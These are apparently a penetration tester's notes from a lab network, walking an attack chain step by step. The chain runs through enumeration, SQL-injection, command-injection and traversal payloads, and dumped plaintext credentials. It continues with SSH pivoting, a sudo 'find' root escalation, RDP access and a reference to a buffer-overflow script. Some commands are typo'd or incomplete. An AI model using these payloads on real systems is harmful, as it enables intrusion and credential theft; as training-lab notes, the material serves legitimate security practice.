```

----------

OP NOTES


TARGET IP: 10.50.42.185

nmap -v -sT -Pn -T4 -sV 10.50.42.185
- 22 (ssh)
- 80 (http)

POTENTAL SERVICE ENUMERATION

nmap -v -sT -Pn -T4 -sV 10.50.42.185 --script=http-enum -p80
- login.php
- login.html
- img
- scripts

COMMAND INJECTION - ; whoami

SQL INJECTION - tom' OR '1'='1

DIRECTORY TRAVERSAL - ../../../../../../../etc/passwd

----------

http://10.50.42.185/getcareers.php?myfile=Executive_Assistant.html

IN THIS CASE, ONLY DIR TRAVERSAL WORKS

../../../../../../../../etc/passwd - root
                                   - user2
                                   - ubuntu

../../../../../../../../etc/hosts  - 192.168.28.181 WebApp

-----------

http://10.50.42.185/login.html

IN THIS CASE, ONLY SQL WORKS

user: tom' OR '1'='1 or admin
pass: tom' OR '1'='1

http://10.50.42.185/login.php?username=tom' OR '1'='1 & passwd=tom' OR '1'='1


- user2  :: RntyrfVfNER78 :: EaglesIsARE78 
-	user3  :: Obo4GURRnccyrf :: Bob4THEEapples
- Lee_Roth OR Lroth :: anotherpassword4THEages
- Aaron :: ncnffjbeqlCn$$jbeq :: apasswordyPa$$word


----------

/img/  ~download images~

----------

/scripts/

system_user=user2
user_password=EaglesIsARE78

----------

logged on as user2 :: EaglesIsARE78

ssh user2@10.50.42.185

sudo -l                                   nothing
find / -perm /6000 -type f 2>/dev/null    nothing
cat /etc/crontab                          nothing unique

pingsweep 192.168.28.0/24 net

for i in {1..254} ;do (ping -c 1  | grep "bytes from" &) ;done

192.168.28.172
192.168.28.181

----------

ssh -MS /tmp/red user2@10.50.42.185
ssh -S /tmp/red red -O forward -D9050

proxychains nmap -v -sT -Pn -T4 -sV 192.168.28.172,181

192.168.28.172
- 22 (ssh)

192.168.28.181
- 22 (ssh)
- 80 (http)

proxychains nmap -v -sT -Pn -T4 -sV 192.168.28.181 --script=http-enum -p80
proxychains nikto -h 192.168.28.181

BROWSE TO PAGE

LOOKS LIKE SQL

http://0.0.0.0:9000/pick.php?product=7 OR 1=1;

dumped information

http://0.0.0.0:9000/pick.php?product=7 union select 1,2,3

http://0.0.0.0:9000/pick.php?product=7 union select table_schema,column_name,table_name FROM information_schema.columns ;

http://0.0.0.0:9000/pick.php?product=7 union select user_id,name,username from siteusers.users ;

----------

ssh -S /tmp/red red -O forward -L 9001:192.168.28.172:22
ssh -S /tmp/red red -O forward -L 9002:192.168.28.181:22

ssh Aaron@192.168.28.172 -p 9001
apasswordyPa$$word

cat /etc/crontab - scripts

sudo -l -          find

https://gtfobins.github.io/

sudo find . -exec /bin/sh \; -quit

ROOT SESSION                                                                          # 192.168.28.172
                                                                                      # 192.168.28.179
RAN PINGSWEEP - FOUND .179                                                            # 192.168.28.181


proxychains nmap -v -sT -Pn -T4 -sV 192.168.28.179

ssh -S /tmp/red red -O cancel -D9050
ssh -S /tmp/orange orange -O forward -D9050

roxychains nmap -v -sT -Pn -T4 -sV 192.168.28.179
- 139
- 445
- 3389

ssh -S /tmp/orange orange -O forward -L 9003:192.168.28.179:3389

xfreerdp /u:Lroth /v:0.0.0.0 /p:anotherpassword4THEages /port:9003  -dynamic-resolution +glyph-cache +clipboard

ssh -S /tmp/orange orange -O forward -L 9004:192.168.28.179:9999
nc 0.0.0.0 9004
SecureServer!

./secureserverBuffo.py

if it doesnt work the first time, regenerate shell code

----------























